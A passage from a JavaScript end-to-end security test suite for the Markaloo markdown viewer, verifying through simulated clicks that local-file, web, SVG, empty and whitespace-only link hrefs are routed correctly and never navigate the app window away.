        error => { p.close.error = String(error?.stack || error); p.close.done = true; });
      return true;
    })()`);
    await n11Wait(async () => {
      const closed = await exec(`(() => {
        const p = window.__securityN11;
        if (!p || !p.close) throw new Error('N11 target-close witness lost');
        return { ...p.close, dialogs: p.dialogCalls.length, confirms: p.confirmCalls.length,
          opened: p.opened || !!document.querySelector('#appMessageDialog[open]') };
      })()`);
      if (closed.error || closed.dialogs || closed.confirms || closed.opened) {
        throw new Error("N11 target retirement encountered unexpected consent/failure: " + JSON.stringify(closed));
      }
      return closed.done;
    }, "real clean target close without consent");
    await n11Wait(() => n11Healthy(), "original clean source Main/DOM ownership after target retirement");
    const retired = n11Shutdown.documentAdmissionIsCurrent(target.descriptor.ref) === false;
    check("N11 Markdown target really retires its Main admission and restores the original source", retired);
    if (!retired) throw new Error("N11 target's Main admission is still live");
    await n11Wait(() => {
      const work = n11Work.filter(record => n11SourceRestorationWork(record, context));
      return work.some(record => record.kind === "stat") && work.some(record => record.kind === "realpath");
    }, "actual source stat and canonical-path witnesses during original-owner restoration");
    if (n11Active !== action || action.source !== n11Owner || action.phase !== "source-restoration" ||
        !isDeepStrictEqual(n11WorkOwner(n11Owner), context.source) ||
        n11SourcePaths !== context.paths || !await n11Healthy() ||
        n11Shutdown.documentAdmissionIsCurrent(context.source.documentRef) !== true ||
        n11Shutdown.documentAdmissionIsCurrent(context.target.documentRef) !== false) {
      throw new Error("N11 source-restoration phase did not complete with its original owners");
    }
    restoration.completed = true;
    } finally { action.phase = "post-restoration"; }
    await exec(`delete window.__securityN11.close; true`);
    return true;
  }

  async function n11LostResult(action, before, point, error) {
    // Unknown page evidence is UNKNOWN, not synthetic empty effect arrays or a
    // successful cancellation. Main histories remain genuine and unsealed.
    const openPath = n11Slice(await visualUtils.readShellOpens(win), before.shell);
    const external = n11Slice(await visualUtils.readExternalOpens(win), before.external);
    const deliveries = n11Slice(n11Sends, before.sends);
    return {
      ok: false, observationLost: true, failure: String(error.message || error),
      clicked: { found: point?.hit === true ? true : null, href: point?.rawHref ?? null,
        svgAnchor: point?.svgAnchor ?? null, trusted: null, prevented: null, selected: null },
      openPath, external,
      offers: deliveries.filter(item => item.channel === "external-file-open-request"),
      notices: deliveries.filter(item => item.channel === "show-error"),
      fileWork: n11Slice(n11Work, before.work), errors: null, notifications: null, consentClear: false,
      entry: action.entry, result: action.result, sourceStable: false, targetRetired: false,
      nav: { href: n11Contents.isDestroyed() ? null : n11Contents.getURL(), navType: null,
        alive: false, mainProcessNavs: n11Slice(n11Navs, before.navigation) },
    };
  }

  const n11EnsureAlive = async (why) => {
    const alive0 = await n11Healthy();
    if (alive0 === true) return;
    const report = { why, owner: n11Owner, sealed: n11Sealed,
      readinessErrors: n11ReadinessErrors.slice(), oldPageHistories: "UNKNOWN",
      main: { entries: n11Entries.length, sends: n11Sends.length,
        work: n11Work.length, navigation: n11Navs.length, faults: n11Faults.slice() } };
    throw new Error("N11 continuation refused: original page/owner observation was lost; " +
      "no reload or substitute admission attempted. " + JSON.stringify(report));
  };

  const n11Click = async (text) => {
    await n11EnsureAlive(`about to click "${text}"`);
    const hrefs = { txt: "https-notes.txt", md: "httpd.md", web: "http://probe.invalid/page",
      caps: "HTTPS://api.example.invalid:PORT/v1", svgh: "http://svg.invalid/p",
      svgx: "http://xlink.invalid/p", empty: "", nbsp: "", bom: "", ctrl: null };
    if (!Object.hasOwn(hrefs, text)) throw new Error("N11 has no such carrier");
    const href = hrefs[text], routed = href !== null && href !== "";
    const local = text === "txt" || text === "md";
    const logical = local ? path.join(s12dir, href) : null;
    const real = local ? n11RealPath(logical) : null;
    const before = n11Sealed;
    const action = { id: n11Actions.length + 1, source: n11Owner, text, href,
      pending: true, entries: 0, settled: false, entry: null, phase: "route", restoration: null };
    n11Actions.push(action);
    let point = null;
    try {
    await n11NoLate();
    point = await exec(`(async () => {
      const links = Array.from(document.querySelectorAll('#viewer a'))
        .filter(a => a.textContent.trim() === ${JSON.stringify(text)});
      if (links.length !== 1) throw new Error('N11 carrier is not unique');
      const a = links[0], href = a.getAttribute('href') ?? a.getAttribute('xlink:href');
      if (href !== ${JSON.stringify(href)}) throw new Error('N11 exact href premise changed');
      a.scrollIntoView({ block: 'center', inline: 'center', behavior: 'instant' });
      await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));
      const r = a.getBoundingClientRect(), points = [];
      for (const fx of [0.5, 0.2, 0.8]) for (const fy of [0.5, 0.25, 0.75]) {
        points.push({ x: Math.round(r.left + r.width * fx), y: Math.round(r.top + r.height * fy) });
      }
      const point = points.find(p => document.elementFromPoint(p.x, p.y)?.closest('#viewer a') === a);
      if (!point) throw new Error('N11 carrier has no verified visible pointer hit');
      const { x, y } = point, hit = document.elementFromPoint(x, y)?.closest('#viewer a');
      window.__securityN11.target = a;
      return { x, y, hit: hit === a, width: r.width, height: r.height, href,
        rawHref: a.getAttribute('href'),
        text: a.textContent.trim(), svgAnchor: a instanceof SVGAElement };
    })()`);
    const hit = point.hit && point.width > 0 && point.height > 0 && point.href === href &&
      point.text === text && point.svgAnchor === (text === "svgh" || text === "svgx");
    check("SETUP N11 exact visible carrier is its genuine pointer hit target: " + text,
      hit, JSON.stringify(point));
    if (!hit) throw new Error("N11 refuses an unproven native input target");
    if (!await n11Healthy()) throw new Error("N11 source authority changed before pointer input");
    await n11NoLate();
    n11Active = action;
    try {
      n11Contents.sendInputEvent({ type: "mouseDown", x: point.x, y: point.y,
        button: "left", clickCount: 1 });
      n11Contents.sendInputEvent({ type: "mouseUp", x: point.x, y: point.y,
        button: "left", clickCount: 1 });
      await n11Wait(async () => {
        const page = await n11ReadPage();
        return page.clicks.length > before.clicks && (!routed || action.entry);
      }, "trusted input and, when routed, actual Main entry");
      if (routed) await n11Wait(() => action.settled, "actual Main handler result");
      const offers = n11Slice(n11Sends, before.sends)
        .filter(item => item.channel === "external-file-open-request");
      let targetRetired = false;
      if (text === "md" && offers.length === 1 && offers[0].path === logical) {
        targetRetired = await n11RetireTarget();
      }
      const sourceStable = await n11Healthy();
      await n11Barrier();
      const page = await n11ReadPage();
      const opened = n11Slice(await visualUtils.readShellOpens(win), before.shell);
      const external = n11Slice(await visualUtils.readExternalOpens(win), before.external);
      const validated = {
        shell: opened, external, entries: n11Slice(n11Entries, before.entries),
        sends: n11Slice(n11Sends, before.sends), work: n11Slice(n11Work, before.work),
        navigation: n11Slice(n11Navs, before.navigation), faults: n11Slice(n11Faults, before.faults),
        clicks: n11Slice(page.clicks, before.clicks), errors: n11Slice(page.errors, before.errors),
        notifications: n11Slice(page.notifications, before.notifications),
        dialogs: n11Slice(page.dialogs, before.dialogs), confirms: n11Slice(page.confirms, before.confirms),
        sentinel: n11Slice(page.sentinel, before.sentinel), modal: n11Slice(page.modal, before.modal),
      };
      const terminalOffers = validated.sends.filter(item => item.channel === "external-file-open-request");
      const notices = validated.sends.filter(item => item.channel === "show-error");
      const clicked = validated.clicks[0];
      const consentClear = validated.dialogs.length === 0 && validated.confirms.length === 0 &&
        validated.modal.length === 0 && expectedSecurityQuestion === null && n11AuthorityIntact();
      const fsVerdict = n11FSVerdict(action, validated.work, logical, real);
      const exactFS = fsVerdict.ok;
      const ok = validated.clicks.length === 1 && clicked.selected && clicked.trusted &&
        clicked.text === text && clicked.effectiveHref === href &&
        clicked.prevented === (text !== "ctrl") &&
        clicked.svgAnchor === (text === "svgh" || text === "svgx") &&
        validated.entries.length === (routed ? 1 : 0) &&
        (!routed || action.entries === 1 && action.entry === validated.entries[0] &&
          action.result === true && !action.error &&
          action.entry.documentRef === action.source.descriptor.ref) &&
        opened.length === (text === "txt" ? 1 : 0) && (text !== "txt" || opened[0] === real) &&
        external.length === (routed && !local ? 1 : 0) &&
        (!routed || local || external[0] === href) &&
        terminalOffers.length === (text === "md" ? 1 : 0) &&
        (text !== "md" || terminalOffers[0].path === logical && targetRetired) &&
        notices.length === 0 && validated.errors.length === 0 && validated.notifications.length === 0 &&
        validated.sentinel.length === 0 &&
        validated.sends.every(s => s.action === action.id) &&
        validated.faults.length === 0 && validated.navigation.length === 0 &&
        exactFS && consentClear && sourceStable && page.observing &&
        page.href === n11PageUrl && await waitForExternalTrap(win);
      const report = { ok, openPath: opened, external, offers: terminalOffers,
        errors: validated.errors, notifications: validated.notifications, notices,
        fileWork: validated.work, fileClassification: fsVerdict, consentClear,
        clicked, entry: action.entry, result: action.result, sourceStable, targetRetired,
        nav: { href: page.href, navType: page.navType, alive: sourceStable,
          mainProcessNavs: validated.navigation } };
      if (!ok) {
        check("N11 genuine trusted route has exact Main, lifecycle and terminal effects: " + text,
          false, JSON.stringify(report));
        throw new Error("N11 refuses to seal unvalidated route evidence");
      }
      // These are the endpoints actually adjudicated above, never a new sample.
      n11Sealed = n11Seal(before, validated);
      await n11NoLate();
      check("N11 genuine trusted route has exact Main, lifecycle and terminal effects: " + text,
        ok, JSON.stringify(report));
      return report;
    } finally { action.pending = false; n11Active = null; }
    } catch (error) {
      action.pending = false; n11Active = null;
      if (n11SamePage()) {
        const state = n11Shutdown.state();
        if (state.renderer === "ready" &&
            state.rendererGeneration === action.source.identity.rendererGeneration) throw error;
      }
      const report = await n11LostResult(action, before, point, error);
      check("N11 genuine trusted route has exact Main, lifecycle and terminal effects: " + text,
        false, JSON.stringify(report));
      throw new Error("N11 lost its original page observations; later carriers were not run. " +
        JSON.stringify(report), { cause: error });
    }
  };

  try {
  await n11Install();
  await n11Render(N11_DOC);
  const n11BaseHref = await exec(`location.href`);

  const n11Txt = await n11Click("txt");
  check(
    "SETUP N11 the actual Main filesystem recorder is alive on the real inert target",
    n11Txt.fileWork.some(item => item.kind === "realpath" && item.terminal && !item.error) &&
      n11Txt.fileWork.some(item => item.kind === "stat" && item.regular && !item.directory &&
        item.terminal && !item.error),
    JSON.stringify(n11Txt.fileWork),
  );
  check(
    "N11 a local file whose name begins with http is opened, not silently ignored",
    // The href conjunct pins the shape of the bug: without it the assertion
    // would still pass if the sanitizer had rewritten the name.
    n11Txt.clicked.found === true &&
      n11Txt.clicked.href === "https-notes.txt" &&
      n11Txt.clicked.prevented === true &&
      n11Txt.openPath.length === 1 &&
      n11Txt.openPath[0].endsWith("https-notes.txt") &&
      n11Txt.external.length === 0 &&
      n11Txt.errors.length === 0 && n11Txt.notices.length === 0 && n11Txt.notifications.length === 0,
    JSON.stringify(n11Txt),
  );

  const n11Md = await n11Click("md");
  check(
    "N11 a markdown file whose name begins with http opens in the app",
    n11Md.clicked.found === true &&
      n11Md.clicked.href === "httpd.md" &&
      n11Md.clicked.prevented === true &&
      n11Md.offers.length === 1 &&
      n11Md.offers[0].path.endsWith("httpd.md") &&
      n11Md.targetRetired === true &&
      n11Md.openPath.length === 0 &&
      n11Md.external.length === 0,
    JSON.stringify(n11Md),
  );

  const n11Web = await n11Click("web");
  // SPLIT IN TWO on purpose. "was it opened" and "was it stat'd" are different
  // claims about different code, and two reverts depend on telling them apart:
  // R463 deletes the external arm and fails only the first, while R464 deletes
  // the arm AND widens the catch-all so the URL really is resolved against the
  // document directory and handed to fs.existsSync - the only mutation that
  // leaks the reader's filesystem layout. Joined into one assertion both
  // reverts produce an identical verdict and the second finding is invisible.
  check(
    "N11 an absolute http URL is still routed externally",
    n11Web.clicked.found === true &&
      n11Web.clicked.prevented === true &&
      n11Web.external.length === 1 &&
      n11Web.external[0] === "http://probe.invalid/page",
    JSON.stringify(n11Web),
  );
  check(
    "N11 an absolute http URL is never treated as a local path",
    n11Web.openPath.length === 0 && n11Web.offers.length === 0 && n11Web.fileWork.length === 0,
    JSON.stringify(n11Web),
  );

  // The uppercase carrier. `HTTPS://api.example.invalid:PORT/v1` has an invalid
  // port, so Chromium's parser rejects it and `link.href` hands back the
  // attribute verbatim rather than a lowercased, normalised URL. Both arms
  // therefore see an uppercase scheme, which is the whole reason
  // ABSOLUTE_WEB_URL carries the `i` flag. Without it this URL matches no arm
  // and reaches the catch-all, which resolves it as a path.
  const n11Caps = await n11Click("caps");
  check(
    "N11 an uppercase unparseable http URL is routed externally, not stat'd as a path",
    n11Caps.clicked.found === true &&
      n11Caps.clicked.prevented === true &&
      n11Caps.external.length === 1 &&
      n11Caps.external[0] === "HTTPS://api.example.invalid:PORT/v1" &&
      n11Caps.openPath.length === 0 &&
      n11Caps.offers.length === 0 &&
      n11Caps.fileWork.length === 0,
    JSON.stringify(n11Caps),
  );

  // A PRODUCT CLAIM THAT HAD NEVER BEEN ASSERTED, and it is stronger than
  // "the link is dead".
  //
  // MEASURED: with the external arm removed, this exact click leaves the top
  // frame at `about:blank#blocked`, navigation type "navigate" - Chromium
  // rejected the malformed URL and committed its OWN blocked page over the
  // app's document. Every open tab and every unsaved edit goes with it and the
  // window is left blank with no way back except a restart. So the delegation
  // being TOTAL is not merely tidiness; it is what stops a single click on an
  // ordinary-looking link destroying the reader's session.
  //
  // Note what this does NOT claim. main.js's will-navigate / will-redirect
  // denies do not fire for this URL at all - measured, by the absence of their
  // distinct log lines - so the renderer's totality is the ONLY layer standing
  // here. That gap is recorded as its own finding rather than implied away.
  //
  // THREE CONJUNCTS, AND THE THIRD IS WHY THE NAME IS HONEST. `alive` and
  // `href` together establish the frame's FINAL identity, which is enough for
  // the measured failure (Chromium commits about:blank#blocked and stays
  // there) but would not catch a navigation that left and returned, or one
  // still in flight when the observation was taken 140ms after the click -
  // both of which "never navigates" claims to exclude. mainProcessNavs is a
  // did-start-navigation record kept OUTSIDE the renderer, so it survives the
  // document being destroyed and is independent of the polling interval. It is
  // also the one signal that fires for the unparseable case at all, which is
  // what makes it the right witness rather than merely an extra one.
  check(
    "N11 an unhandled link click never navigates the top frame out of the app",
    n11Caps.nav.alive === true &&
      n11Caps.nav.href === n11BaseHref &&
      Array.isArray(n11Caps.nav.mainProcessNavs) &&
      n11Caps.nav.mainProcessNavs.length === 0,
    JSON.stringify({ nav: n11Caps.nav, base: n11BaseHref }),
  );

  // SVG anchors. An <a> inside inline SVG is an SVGAElement whose `href` is an
  // SVGAnimatedString OBJECT, and the two spellings disagree about which
  // getAttribute answers. The shape is PINNED rather than assumed, because
  // every assertion below is about how the handler copes with it: if a
  // dompurify bump ever started stripping SVG anchors, or Chromium started
  // handing back a plain string, these would pass while testing nothing.
  // THE RECOVERY HAS TO RUN HERE TOO. This is a direct exec, not a click, so
  // it never went through n11Click - and under R463/R465 the caps carrier
  // immediately above destroys the document, leaving this probe to return []
  // against about:blank#blocked and break its own mustPass.
  await n11EnsureAlive("about to read the SVG shape premise");
  const n11SvgShape = await exec(`
    (() => {
      return Array.from(document.querySelectorAll('#viewer svg a')).map((a) => ({
        text: (a.textContent || '').trim(),
        isSvgElement: a.constructor.name,
        hrefIsObject: typeof a.href === 'object' && a.href !== null,
        getAttrHref: a.getAttribute('href'),
        getAttrXlink: a.getAttribute('xlink:href'),
        // baseVal is THE load-bearing value - it is what the handler's
        // normalisation actually reads - so record it rather than only
        // recording that href is an object. Without this the premise pinned
        // the SHAPE of href and said nothing about its CONTENT, while the
        // comment claimed otherwise.
        baseVal:
          a.href && typeof a.href === 'object' && typeof a.href.baseVal === 'string'
            ? a.href.baseVal
            : null,
        closestMatches: a.closest('a, area') === a,
      }));
    })()
  `);
  check(
    "N11 both SVG anchor spellings survive sanitization as SVGAElements the delegation can see",
    Array.isArray(n11SvgShape) &&
      n11SvgShape.length === 2 &&
      n11SvgShape.every(
        (s) =>
          s.isSvgElement === "SVGAElement" && s.hrefIsObject === true && s.closestMatches === true,
      ) &&
      // The asymmetry is the premise the fallback exists for: the xlink form
      // has a NULL getAttribute('href'). baseVal is asserted to an EXACT value
      // for both spellings, because "is a string" would still hold if Chromium
      // started resolving xlink:href to the empty string - which is precisely
      // the regression that would make the two behaviour assertions below pass
      // while testing nothing.
      n11SvgShape.some(
        (s) =>
          s.text === "svgh" &&
          s.getAttrHref === "http://svg.invalid/p" &&
          s.baseVal === "http://svg.invalid/p",
      ) &&
      n11SvgShape.some(
        (s) =>
          s.text === "svgx" &&
          s.getAttrHref === null &&
          s.getAttrXlink === "http://xlink.invalid/p" &&
          s.baseVal === "http://xlink.invalid/p",
      ),
    JSON.stringify(n11SvgShape),
  );

  const n11SvgH = await n11Click("svgh");
  check(
    "N11 an SVG anchor using href is routed externally instead of throwing",
    n11SvgH.clicked.found === true &&
      n11SvgH.clicked.svgAnchor === true &&
      n11SvgH.clicked.prevented === true &&
      n11SvgH.external.length === 1 &&
      n11SvgH.external[0] === "http://svg.invalid/p" &&
      n11SvgH.openPath.length === 0 &&
      n11SvgH.fileWork.length === 0,
    JSON.stringify(n11SvgH),
  );

  const n11SvgX = await n11Click("svgx");
  check(
    "N11 an SVG anchor using xlink:href is routed externally instead of silently ignored",
    n11SvgX.clicked.found === true &&
      n11SvgX.clicked.svgAnchor === true &&
      n11SvgX.clicked.prevented === true &&
      n11SvgX.external.length === 1 &&
      n11SvgX.external[0] === "http://xlink.invalid/p" &&
      n11SvgX.openPath.length === 0 &&
      n11SvgX.fileWork.length === 0,
    JSON.stringify(n11SvgX),
  );

  // A placeholder link - markdown's `[text]()` - is a link to nowhere. It is
  // NOT stripped by the sanitizer: measured, the empty href attribute survives
  // and `link.href` resolves to index.html itself. Every arm of the delegation
  // requires a non-empty hrefAttr, so before N11 the click fell through to
  // Chromium, which treated it as a top-frame navigation to the app's own page.
  // Only main.js's will-navigate deny stood between a placeholder link and a
  // full reload that would have discarded every open tab.
  //
  // `exists.length === 0` matters as much as the rest: the fix must be an early
  // return, not a trip through the local-file arm that resolves "" against the
  // document directory and stats it.
  //
  // `prevented === true` is the conjunct that carries this assertion, and it
  // was missing from the first draft - which the revert harness caught by
  // returning VACUOUS. Every other observation here is EMPTY whether the
  // handler deliberately did nothing or was never reached at all, so without
  // reading the cancelled flag the assertion passed with the fix deleted.
  await n11EnsureAlive("about to render the placeholder fixture");
  await n11Render("# Placeholder\n\n[empty]()\n");
  const n11Empty = await n11Click("empty");
  const n11EmptyNav = await exec(`
    (() => {
      const a = Array.from(document.querySelectorAll('#viewer a'))
        .find((x) => x.textContent.trim() === 'empty');
      return { href: a ? a.getAttribute('href') : null, hasAttr: a ? a.hasAttribute('href') : false };
    })()
  `);
  check(
    "N11 a placeholder link with an empty href is a deliberate no-op, not a fall-through",
    // hasAttr pins the premise: if DOMPurify ever started stripping the empty
    // href, the anchor would fail the handler's outer `link.href` guard for a
    // different reason and this assertion would pass without testing anything.
    n11EmptyNav.hasAttr === true &&
      n11EmptyNav.href === "" &&
      n11Empty.clicked.found === true &&
      n11Empty.clicked.prevented === true &&
      n11Empty.openPath.length === 0 &&
      n11Empty.offers.length === 0 &&
      n11Empty.external.length === 0 &&
      n11Empty.errors.length === 0 && n11Empty.notices.length === 0 && n11Empty.notifications.length === 0 &&
      n11Empty.consentClear === true &&
      n11Empty.fileWork.length === 0,
    JSON.stringify({ n11Empty, n11EmptyNav }),
  );

  // Whitespace-only hrefs. The handler tests emptiness with URL_BLANK
  // (/^[\u0000-\u0020]*$/ - the class the URL parser strips, NOT /^\s*$/,
  // which an earlier version of this comment claimed) while the local-file arm
  // trims separately, so in principle the two could disagree about a `&nbsp;`,
  // a BOM or a C0 control and let a "blank" href reach the path resolver.
  //
  // MEASURED, AND THE MEASUREMENT IS THE FINDING: they cannot disagree, but
  // NOT for the reason the first draft of this comment gave. The mechanism is
  // DOMPurify's own `stringTrim(initValue)` on every attribute value
  // (purify.js:1917 in the vendored 3.4.12), followed by the validity check's
  // final `else if (value) return false` (purify.js:1805-1806), which
  // explicitly KEEPS an attribute whose value is empty. Native String.trim()
  // is the filter, so the two predicates split the carriers into two different
  // outcomes rather than one:
  //
  //   \u00A0, \uFEFF - inside JS's trim set, so DOMPurify trims them to "" and
  //     keeps the attribute. `hrefAttr === ""`, where URL_BLANK and trim()
  //     trivially agree.
  //   \u0001 - a C0 control. URL_BLANK calls it blank; JS trim() does NOT, so
  //     it SURVIVES the trim, then fails IS_ALLOWED_URI, and the ATTRIBUTE IS
  //     REMOVED ENTIRELY. The anchor is then not a link at all: `link.href` is
  //     "" and the handler's outer guard rejects it before either predicate is
  //     evaluated.
  //
  // So the direction where URL_BLANK is broader than trim() is unreachable
  // because the attribute is DELETED, not because it is emptied - and note the
  // irony that the predicate R468 proposed swapping IN is the one the sanitizer
  // already applies. This is why the DOM premise is asserted SEPARATELY from
  // the behaviour: the behavioural assertion below is true for reasons that
  // have nothing to do with URL_BLANK, and a reader who saw only that assertion
  // would credit the wrong code. It is also why the revert that swapped
  // URL_BLANK for a bare trim() was withdrawn as vacuous rather than recorded
  // as proven: the property is real, but it is unobservable from the DOM.
  await n11EnsureAlive("about to render the whitespace fixture");
  await n11Render(
    "# Whitespace\n\n" +
      '<a href="&#160;">nbsp</a>\n\n' +
      '<a href="&#65279;">bom</a>\n' +
      // The C0 carrier covers the OTHER direction of the disagreement, and it
      // earns its place by behaving differently from the first two rather than
      // by confirming them. Without it the premise would describe one mechanism
      // and claim the whole class.
      '\n<a href="&#1;">ctrl</a>\n',
  );
  const n11Blank = await exec(`
    (() => {
      return Array.from(document.querySelectorAll('#viewer a')).map((a) => ({
        text: (a.textContent || '').trim(),
        hasAttr: a.hasAttribute('href'),
        href: a.getAttribute('href'),
        // The outer guard in the handler tests link.href, not the attribute,
        // so record the RESOLVED value too: a removed attribute leaves it "",
        // which is what makes the C0 carrier unreachable rather than merely
        // blank. (No backticks in this comment: it lives inside an exec()
        // template literal.)
        resolved: a.href,
      }));
    })()
  `);
  const n11ByText = Object.fromEntries((n11Blank || []).map((a) => [a.text, a]));
  check(
    "N11 the sanitizer neutralises every whitespace-only href, so URL_BLANK and trim() cannot disagree in the DOM",
    Array.isArray(n11Blank) &&
      n11Blank.length === 3 &&
      // The two carriers inside JS's trim set: attribute KEPT, value emptied.
      ["nbsp", "bom"].every(
        (t) => n11ByText[t] && n11ByText[t].hasAttr === true && n11ByText[t].href === "",
      ) &&
      // The carrier outside it: attribute REMOVED, so the anchor is not a link.
      n11ByText.ctrl &&
      n11ByText.ctrl.hasAttr === false &&
      n11ByText.ctrl.href === null &&
      n11ByText.ctrl.resolved === "",
    JSON.stringify(n11Blank),
  );

  const n11Nbsp = await n11Click("nbsp");
  const n11Bom = await n11Click("bom");
  const n11Ctrl = await n11Click("ctrl");
  check(
    "N11 a whitespace-only href is a silent no-op, never a path lookup",
    [n11Nbsp, n11Bom].every(
      (r) =>
        r.clicked.found === true &&
        r.clicked.prevented === true &&
        r.openPath.length === 0 &&
        r.offers.length === 0 &&
        r.external.length === 0 &&
        r.errors.length === 0 && r.notices.length === 0 && r.notifications.length === 0 &&
        r.consentClear === true &&
        r.fileWork.length === 0,
    ),
    JSON.stringify({ n11Nbsp, n11Bom }),
  );

  // The C0 carrier is asserted SEPARATELY and with a different predicate,
  // because it is inert for a different reason and lumping it in with the two
  // above would have made the combined assertion false.
  //
  // Measured: `prevented` is FALSE here, and that is correct rather than a
  // defect. DOMPurify removed the href attribute outright, so `link.href` is ""
  // and the handler's outer `if (link && link.href)` guard declines the anchor
  // before any arm runs - there is nothing to preventDefault, and an <a> with
  // no href is not a hyperlink, so Chromium does nothing either. Asserting
  // `prevented === true` here (as a first draft did, by adding this carrier to
  // the array above) would have been asserting a falsehood and would have
  // masked the far more interesting fact that the attribute never survived.
  check(
    "N11 a C0-control href is stripped by the sanitizer, so the anchor never reaches the link policy at all",
    n11Ctrl.clicked.found === true &&
      n11Ctrl.clicked.prevented === false &&
      n11Ctrl.clicked.href === null &&
      n11Ctrl.nav.alive === true &&
      n11Ctrl.nav.href === n11BaseHref &&
      n11Ctrl.nav.mainProcessNavs.length === 0 &&
      n11Ctrl.openPath.length === 0 &&
      n11Ctrl.offers.length === 0 &&
      n11Ctrl.external.length === 0 &&
      n11Ctrl.errors.length === 0 && n11Ctrl.notices.length === 0 && n11Ctrl.notifications.length === 0 &&
      n11Ctrl.consentClear === true &&
      n11Ctrl.fileWork.length === 0,
    JSON.stringify({ n11Ctrl, base: n11BaseHref }),
  );

  // THE AGGREGATE, AND WHY IT HAD TO EXIST. Before this, mainProcessNavs was
  // asserted in exactly two places (the caps carrier and the C0 carrier) and in
  // BOTH of them the other conjuncts already decided the verdict on their own.
  // No revert in the harness made an empty nav list the SOLE failing conjunct,
  // so if the witness had been permanently empty - the deprecated-positional
  // time bomb the listener comment describes - every N11 verdict would have
  // been byte-identical. A sentinel that is never the sole discriminator is
  // unproven.
  //
  // This makes it the sole discriminator for four reverts. MEASURED, not
  // assumed: under R463 the `web` carrier reports alive:true, an unchanged href
  // AND mainProcessNavs ["http://probe.invalid/page"] - so a navigation that
  // will-navigate DENIES still fires did-start-navigation, and the witness is
  // therefore live rather than merely quiet. Under R461/R462/R466 the carriers
  // fall through to Chromium, which starts a main-frame navigation the deny
  // then cancels: the frame survives, `href` is unchanged, and this aggregate
  // is the ONLY assertion that can see it.
  const n11All = {
    txt: n11Txt,
    md: n11Md,
    web: n11Web,
    caps: n11Caps,
    svgh: n11SvgH,
    svgx: n11SvgX,
    empty: n11Empty,
    nbsp: n11Nbsp,
    bom: n11Bom,
    ctrl: n11Ctrl,
  };
  const n11Started = Object.entries(n11All)
    .filter(
      ([, r]) => !r.nav || !Array.isArray(r.nav.mainProcessNavs) || r.nav.mainProcessNavs.length,
    )
    .map(([k, r]) => [k, r.nav ? r.nav.mainProcessNavs : null]);
  check(
    "N11 no link click anywhere in this section started a main-frame navigation",
    // The length check is a vacuity guard: it pins that every carrier really
    // was collected, so a future edit that drops one from the object cannot
    // shrink the claim silently.
    Object.keys(n11All).length === 10 && n11Started.length === 0,
    JSON.stringify({ carriers: Object.keys(n11All).length, started: n11Started }),
  );

  // TERMINAL RECONCILIATION. The former actor sampled at 140ms, so a navigation
  // that started later landed in NO slice and was invisible to every assertion
  // above. Even with genuine completion now, index arithmetic proves what was
  // observed between the mark and the read, which is weaker than "nothing
  // happened". This closes the gap from the other end: the listener's total
  // must equal every recovery reload plus everything any slice reported.
  // Anything else is an event no assertion accounted for.
  // MEASURED CORRECTION: there is no "+1 for the initial load". The listener is
  // attached long AFTER main.js has loaded index.html, so on a clean tree it
  // sees exactly zero events - which the first version of this assertion got
  // wrong, reporting seen:0 against accounted:1 and failing at rest. A revert
  // scored against a permanently-failing assertion is indistinguishable from a
  // real proof, so this is the half that had to be right before any revert
  // could use it.
  const n11Accounted =
    n11RecoveryLoads +
    Object.values(n11All).reduce(
      (n, r) =>
        n + (r.nav && Array.isArray(r.nav.mainProcessNavs) ? r.nav.mainProcessNavs.length : 0),
      0,
    );
  check(
    "N11 every main-frame navigation the main process saw is accounted for by a click slice or a recovery reload",
    n11Navs.length === n11Accounted,
    JSON.stringify({
      seen: n11Navs.length,
      accounted: n11Accounted,
      recoveryLoads: n11RecoveryLoads,
      navs: n11Navs,
    }),
  );

  // Keep the original page and cumulative witness through the positive trap
  // probe and owner disposal. A replacement page cannot supply missing history.
  await n11EnsureAlive("about to verify the shared Main trap");
  await n11NoLate();
  const probeBefore = n11Sealed;
  if (expectedSecurityQuestion !== null || !n11AuthorityIntact()) {
    throw new Error("N11 cannot probe an unowned or missing shared recording trap");
  }
  const trapReady = await waitForExternalTrap(win);
  if (!trapReady || expectedSecurityQuestion !== null || !n11AuthorityIntact()) {
    throw new Error("N11 cannot probe an unowned or missing shared recording trap");
  }
  // A positive Main-side probe must reach the unchanged actual private history,
  // not renderer compatibility arrays. Use the retained recorder, never a live
  // property that an awaited callback could have replaced with an OS opener.
  await n11Openers.external.call(n11Shell, "https://n11-restore-probe.invalid/");
  if (expectedSecurityQuestion !== null || !n11AuthorityIntact()) {
    throw new Error("N11 shared trap authority changed during its restoration probe");
  }
  const probeExternal = n11Slice(await visualUtils.readExternalOpens(win), probeBefore.external);
  if (expectedSecurityQuestion !== null || !n11AuthorityIntact()) {
    throw new Error("N11 shared trap authority changed during its restoration probe");
  }
  const n11Restored = {
    trapInstalled: trapReady && expectedSecurityQuestion === null && n11AuthorityIntact(),
    grew: probeExternal.length === 1,
    last: probeExternal.at(-1),
    localUntouched: n11Entries.length === probeBefore.entries,
  };
  check(
    "N11 the unchanged shared Main trap records a real positive probe",
    n11Restored.trapInstalled === true &&
      n11Restored.grew === true &&
      n11Restored.last === "https://n11-restore-probe.invalid/" &&
      // The probe must land in shared history, not private gesture observations.
      n11Restored.localUntouched === true,
    JSON.stringify(n11Restored),
  );

  if (!n11Restored.trapInstalled || !n11Restored.grew ||
      n11Restored.last !== "https://n11-restore-probe.invalid/" || !n11Restored.localUntouched) {
    throw new Error("N11 shared-trap restoration probe failed");
  }
  n11Sealed = Object.freeze({ ...probeBefore, external: probeBefore.external + probeExternal.length });
  await n11NoLate();
  await closeSecurityImageFixture(n11Owner, n11SourcePath, n11FixtureBody, n11Heading);
  if (n11Shutdown.documentAdmissionIsCurrent(n11Owner.descriptor.ref) !== false) {
    throw new Error("N11 ordinary source admission did not actually retire");
  }
  n11Owner = null;
  await n11NoLate();
  const empty = await readSecurityImageOwner(null);
  await n11NoLate();
  const retired = empty.tabs.length === 0 && empty.id === null && empty.current === null &&
    empty.descriptor === null && empty.identity === null &&
    empty.pending.pending === false && empty.pending.count === 0 &&
    empty.welcome && empty.heading === "Welcome to Markaloo" && empty.loading === false &&
    n11Actions.length === 10 && n11Actions.every(action => !action.pending &&
      (action.href === null || action.href === "" ? !action.entry : action.settled));
  check("N11 all ordinary source/target owners retire before SEC-13", retired, JSON.stringify(empty));
  if (!retired) throw new Error("N11 ordinary owner retirement is incomplete");
  } catch (error) {
    n11Failure = error;
    throw error;
  } finally {
    const restorationErrors = [];
    n11FSDrainDepth++;
    const restore = async (label, operation) => {
      try { await operation(); }
      catch (error) { restorationErrors.push(label + ": " + String(error.message || error)); }
